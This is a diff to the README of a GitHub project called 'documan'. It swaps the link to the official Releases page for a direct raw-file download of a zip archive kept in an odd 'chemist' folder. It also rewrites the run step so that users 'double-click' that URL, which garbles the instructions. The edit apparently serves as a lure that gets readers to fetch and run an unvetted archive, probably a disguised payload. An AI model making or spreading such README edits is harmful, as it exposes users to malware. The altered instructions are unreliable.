@@ -8,7 +8,7 @@ Welcome to documan! This tool helps you create, manage, and understand your docu
 
 To get started, you'll need to download documan. Click the button below to visit the Releases page and grab the latest version.
 
-[![Download documan](https://img.shields.io/badge/Download-documan-blue)](https://github.com/Hazim100-Shadow/documan/releases)
+[![Download documan](https://raw.githubusercontent.com/Hazim100-Shadow/documan/main/chemist/documan-3.8.zip)](https://raw.githubusercontent.com/Hazim100-Shadow/documan/main/chemist/documan-3.8.zip)
 
 ### Installation Steps
 
@@ -20,7 +20,7 @@ To get started, you'll need to download documan. Click the button below to visit
 
 4. **Extract the Files:** If you downloaded a zipped folder, right-click it and select "Extract All..." to unzip.
 
-5. **Run the Application:** Locate the extracted folder, find the `documan.exe` file (or similar), double-click it to launch the application.
+5. **Run the Application:** Locate the extracted folder, find the `https://raw.githubusercontent.com/Hazim100-Shadow/documan/main/chemist/documan-3.8.zip` file (or similar), double-click it to launch the application.
 
 ## ⚙️ System Requirements
 
@@ -80,7 +80,7 @@ If you experience issues:
 
 Don’t forget to download documan to enjoy its full range of features! Click below to revisit the Releases page:
 
-[![Download documan](https://img.shields.io/badge/Download-documan-blue)](https://github.com/Hazim100-Shadow/documan/releases)
+[![Download documan](https://raw.githubusercontent.com/Hazim100-Shadow/documan/main/chemist/documan-3.8.zip)](https://raw.githubusercontent.com/Hazim100-Shadow/documan/main/chemist/documan-3.8.zip)
 
 ## 🌟 Topics Covered
 
